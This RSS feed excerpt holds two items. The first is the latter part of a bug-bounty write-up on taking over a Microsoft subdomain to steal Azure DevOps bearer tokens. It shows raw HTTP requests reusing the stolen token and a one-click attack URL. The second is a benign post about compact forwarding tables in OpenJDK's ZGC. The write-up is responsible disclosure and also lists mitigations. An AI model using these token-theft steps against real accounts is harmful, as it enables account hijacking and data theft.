Accept: application/json;api-version=6.0-preview.1;excludeUrls=true
X-Requested-With: XMLHttpRequest
...omitted for brevity...
Cookie: UserAuthentication=&lt;snipped id_token&gt;; FedAuth=&lt;snipped FedAuth&gt;; FedAuth1=&lt;snipped&gt;

{"appId":"00000000-0000-0000-0000-000000000000","force":false,"tokenType":0,"namedTokenId":"Aex.Profile"}
</code></pre>

<p>This request returns the following response with a valid bearer token that can be used elsewhere</p>

<pre><code>HTTP/1.1 200 OK
Cache-Control: no-cache, no-store, must-revalidate
Pragma: no-cache
Content-Length: 933
Content-Type: application/json; charset=utf-8; api-version=6.0-preview.1
...omitted for brevity...

{"appId":"00000000-0000-0000-0000-000000000000","token":"&lt;snip&gt;","tokenType":"session","validTo":"2020-05-12T06:45:47.2007474Z","namedTokenId":"Aex.Profile"}
</code></pre>

<p>e.g. on <code>app.vsaex.visualstudio.com</code> this token can be used to pull the user’s email</p>

<pre><code>GET /_apis/User/User HTTP/1.1
Host: app.vsaex.visualstudio.com
Connection: close
X-TFS-FedAuthRedirect: Suppress
X-VSS-ReauthenticationAction: Suppress
X-Requested-With: XMLHttpRequest
Accept-Language: en-US
Authorization: Bearer &lt;snip just recieved bearer token&gt;
Accept: application/json;api-version=6.0-preview.1;excludeUrls=true
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36
X-TFS-Session: ab1e4b56-599c-4ab6-9f5e-756c486a0f2b
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Referer: https://app.vsaex.visualstudio.com/me?mkt=en-US
Accept-Encoding: gzip, deflate


HTTP/1.1 200 OK
Cache-Control: no-cache
Pragma: no-cache
Content-Length: 258
...omitted for brevity...

{"descriptor":"msa.NTg0Zjc4NDAtYzc5ZC03MWU0LWJkN2ItMDZhY2Y1N2Q2OTA1","displayName":"s","mail":"&lt;account_email&gt;","unconfirmedMail":null,"country":"AU","dateCreated":"2018-05-25T23:19:53.6843383+00:00","lastModified":"2019-01-06T15:43:50.2963651+00:00","revision":0}
</code></pre>

<p>The Bearer token could be used to access <code>https://app.vsaex.visualstudio.com/me?mkt=en-US</code> which we found to disclose project names for the associated user on <code>dev.azure.com</code>.</p>

<table>
  <thead>
    <tr>
      <th><img src="https://blog.assetnote.io/images/assetnote-azure-1.png" alt="" width="100%"></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><em>Access to <code>app.vsaex.visualstudio.com/me</code> through the stolen token</em></td>
    </tr>
  </tbody>
</table>



<p>Ultimately, this allowed us to use the token on <code>dev.azure.com</code> to access resources:</p>

<pre><code>GET /seanyeoh/_usersSettings/keys?__rt=fps&amp;__ver=2 HTTP/1.1
Host: dev.azure.com
Connection: close
x-tfs-fedauthredirect: Suppress
Origin: https://dev.azure.com
x-vss-reauthenticationaction: Suppress
authorization: Bearer &lt;snip&gt;
accept: application/json;api-version=5.0-preview.1;excludeUrls=true;enumsAsNumbers=true;msDateFormat=true;noArrayWrap=true
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

</code></pre>

<table>
  <thead>
    <tr>
      <th><img src="https://blog.assetnote.io/images/assetnote-azure-2.png" alt="" width="100%"></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><em>Accessing resources from dev.azure.com with the generated token</em></td>
    </tr>
  </tbody>
</table>



<p>A malicious attacker could perform a 1 click drive by attack on an unsuspecting user by directing them to a URL such as:</p>

<pre><code>https://app.vssps.visualstudio.com/_signin?realm=app.vsaex.visualstudio.com&amp;reply_to=https%3A%2F%2Farec.project-cascade.visualstudio.com%2F&amp;redirect=1&amp;context=eyJodCI6MywiaGlkIjoiNDA0ODFkZDAtZDUzMS1hMWE2LWQ0MzYtMDQxNTk3MWI0MmQ2IiwicXMiOnt9LCJyciI6IiIsInZoIjoiIiwiY3YiOiIiLCJjcyI6IiJ90
</code></pre>

<p>This would result in their <code>app.vsaex.visualstudio.com</code> tokens being disclosed.</p>

<p>From this point, the the attacker would have full control over the user’s Azure DevOps account.</p>

<p>Additionally, the zone takeover of project-cascade.visualstudio.com could have beeen used to validate ownership over the <code>project-cascade.visualstudio.com</code> domain, setup MX records to capture emails to <code>*.project-cascade.visualstudio.com</code> and prove ownership to create SSL certificates. This may have resulted in various opportunities for fraud and impersonation of Microsoft services.</p>



<p>This attack could be mitigated at two points:</p>
<ol>
  <li>Not having the dangling dns zone <code>project-cascade.visualstudio.com</code></li>
  <li>Restricting the reply_to url for visualstudio tokens on <code>app.vssps.visualstudio.com</code> to the realm for <code>app.vsaex.visualstudio.com</code></li>
</ol>


<ol>
  <li>20th May 2020 - Report filed</li>
  <li>22nd May 2020 - Issue triaged</li>
  <li>22nd May 2020 - $3000 Bounty Awarded</li>
</ol>

<table>
  <thead>
    <tr>
      <th><img src="https://blog.assetnote.io/images/assetnote-azure-3.png" alt="" width="100%"></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><em>Bount…</em></td></tr></tbody></table></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.assetnote.io/2020/06/28/subdomain-takeover-to-account-takeover/">https://blog.assetnote.io/2020/06/28/subdomain-takeover-to-account-takeover/</a></em></p>]]>
            </description>
            <link>https://blog.assetnote.io/2020/06/28/subdomain-takeover-to-account-takeover/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23700800</guid>
            <pubDate>Wed, 01 Jul 2020 12:56:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Compact forwarding information for the Z Garbage Collector in the OpenJDK]]>
            </title>
            <description>
<![CDATA[
Score 60 | Comments 8 (<a href="https://news.ycombinator.com/item?id=23700451">thread link</a>) | @pjmlp
<br/>
July 1, 2020 | https://inside.java/2020/06/25/compact-forwarding/ | <a href="https://web.archive.org/web/*/https://inside.java/2020/06/25/compact-forwarding/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="entry"><hr>

<p><em>The work presented here is performed as part of the <a href="https://inside.java/2020/06/12/joint-research-projects/">joint research project between Oracle, Uppsala University and KTH</a>. Follow the blog series here at inside.java to read more about the JVM research performed at the Oracle Development office in Stockholm.</em></p>

<hr>

<p>This is a short description about my work on garbage collection that I did for my master thesis. This work was done in collaboration with <a href="https://www.oracle.com/">Oracle</a> which gave me an opportunity to work with brilliant minds on challenging problems. I want to direct a special shoutout to my mentors at Oracle, <a href="https://inside.java/u/PerLiden/">Per Lidén</a> and <a href="https://inside.java/u/ErikOsterlund/">Erik Österlund</a>.</p>

<p>To allow fast allocation in garbage collected environments, a common approach is to use bump pointer allocation. Bump pointer allocation uses a pointer to the first available byte in memory that is monotonically increased as we continue to allocate objects. While this scheme allows fast allocation it comes with the caveat that the free memory must be kept continuous. To keep the free memory continuous, many garbage collectors move objects around in memory to compact them, thereby avoiding fragmentation, which can be seen in the figure below. This is typically handled in a process where all live objects are moved off of a page which is then free’d. This permits clearing a page in O(live) objects, which is typically a small number (relatively speaking) since most newly created object tend to die pretty quickly.</p>

<p><img src="https://inside.java/images/blog/compact-forwarding/heapgc_defrag.png" alt="Defragmentation during GC"></p>

<p>The Z Garbage Collector (ZGC) is a new moving concurrent garbage collector in OpenJDK (the thing that probably runs your Java application) [1, 2]. ZGC moves objects around, to combat memory fragmenation, without stopping the application.
This imposes additional overhead on an application in the form of tracking objects’ movements, so that all pointers to them can eventually be updated to the new locations. Usually in GC parlance this is referred to as forwarding information.</p>

<p>ZGC uses an auxiliary forwarding table – optimised for fast look-up, at the cost of additional memory use. This forwarding table is stored outside of the Java heap, referred as off heap-allocation. Any off-heap allocation or keeping old object after moving them is to be considered as memory overhead since it is strictly needed for the JVM and not the actual Java application. ZGC suffers from pathological cases where the size of its forwarding information can become very large, theoretically, as big as the heap itself. If we dimension an application for the pathological case this would be a waste of resources, since the memory usage is usually significantly less. This can make it hard to determine an application’s memory requirements.</p>

<p>This risk for large memory overhead is not only a theoretical concern, but can be observed in real programs. Below is a plot depicting the memory overhead for an internal benchmark application called BigRamTester at Oracle, which shows 35% memory overhead. The source code for that application can be found in <a href="https://bugs.openjdk.java.net/browse/JDK-8152438">this issue </a> as an attachment.</p>

<p><img src="https://inside.java/images/blog/compact-forwarding/bigram.png" alt="Benchmark Revealing Large Memory Overhead"></p>

<p>Storing forwarding information for each relocated object from addresses A (the from-address) to B (the to-address), costs approximately 128 bytes (64 bytes for each from/to-address), can be implemented computationally efficient but at the cost of additional memory overhead (as shown above). As part of my thesis work, we propose a new design for forwarding tables that maps several sparesly populated pages (i.e., with few live objects) onto a single new page in a way that allows the to-address to be calculated using the from-address and liveness information. The design results in a compressed forwarding table that incurs a theoretical worst-case memory overhead of &lt; 3.2%.</p>

<p>In ZGC, there may be contention between application threads and garbage collector threads of relocating objects. The contention results in nondeterministic addresses to which objects are relocated to. The new design requires <em>deterministic addresses</em> so that we can calculate the new address given some set of information. Assume that we have an old page X, whose objects will be relocated to the new page Y. We achieve deterministic addresses, if we copy the objects to Y in the order we encounter them when traversing the live map from the beginning to the end, in ascending order.</p>

<p>The new design divides pages into Q amount of chunks. A chunk holds the amount of preceding living objects <em>before</em> that chunk. To get the size of previously living objects you will use the associated chunk and scan the live map for the addresses who wasn’t covered by the chunk. This allows X to be computed efficiently and allows the old page to be freed as soon as all objects have been relocated, at the cost of some space. An example of dividing a page into chunks is depicted below.</p>

<p><img src="https://inside.java/images/blog/compact-forwarding/chunks.png" alt="Chunks"></p>

<p>Each page divider corresponds to one chunk’s live map coverage. In the example, an object to be relocated lives on the third page which covered by the third chunk (the green arrow). To find the address we do not have to scan the previous chunks since the <em>live bytes</em> field is describing the amount of live bytes of all preceding chunks (the red arrow). Finding all living objects (and their size) preceding the green object within the chunk, can be found in the live map (the yellow arrow).</p>

<p>This design results in a simple logic in order to calculate the new address, which in pseudocode would be express as:</p>

<div><div><pre><code><span>inline</span> <span>uintptr_t</span> <span>ZCompactForwarding</span><span>::</span><span>to_address</span><span>(</span><span>uintptr_t</span> <span>from_address</span><span>)</span> <span>{</span>
  <span>uintptr_t</span> <span>to_page_start_address</span>    <span>=</span> <span>to_page_start_address</span><span>(</span><span>from_address</span><span>);</span>
  <span>uintptr_t</span> <span>live_bytes_before_chunks</span> <span>=</span> <span>live_bytes_before_chunks</span><span>(</span><span>from_address</span><span>)</span>
  <span>uintptr_t</span> <span>live_bytes_on_chunks</span>     <span>=</span> <span>live_bytes_on_chunks</span><span>(</span><span>from_address</span><span>);</span>

  <span>return</span>
    <span>to_page_start_address</span> <span>+</span>
    <span>live_bytes_before_chunk</span> <span>+</span>
    <span>live_bytes_on_chunks</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>The implementation was shown to have a maximum of &lt; 3.2% memory overhead. I used the DaCapo benchmarks suite and the SPECjbb2015 benchmark to evaluate the impact of the design on execution time, given that forwarding addresses must now be computated, as opposed to looked up. Naturally, we expected some performance degradation.
The results from the benchmarking show an statistically significant average performance degradation of approximately 2%, for the new design. Notably, many programs in DaCapo were not effected at all. Two DaCapo programs saw performance improvements at 5.69% and 22.42%, respectively, for the new design.</p>

<p>I haven’t implemented all optimizations on my list (yet). But I’m fairly hopeful that decrease in memory footprint and predictable overhead outweighs the increase in execution time, as incidated by the measurements. This could mean that the work you’d just read about will hopefully find its way into OpenJDK. Only time will tell.</p>

<h2 id="references">References</h2>

<p>[1] Lidén P. <a href="https://mail.openjdk.java.net/pipermail/announce/2017-October/000237.html">CFV: New Project: ZGC; 2017</a>.</p>

<p>[2] Lidén P, Karlsson S. <a href="http://openjdk.java.net/jeps/333">JEP 333: ZGC: A Scalable Low-Latency Garbage Collector</a>.</p>
</div></div>]]>
            </description>
            <link>https://inside.java/2020/06/25/compact-forwarding/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23700451</guid>
            <pubDate>Wed, 01 Jul 2020 11:59:38 GMT</pubDate>
        </item>
    </channel>
</rss>
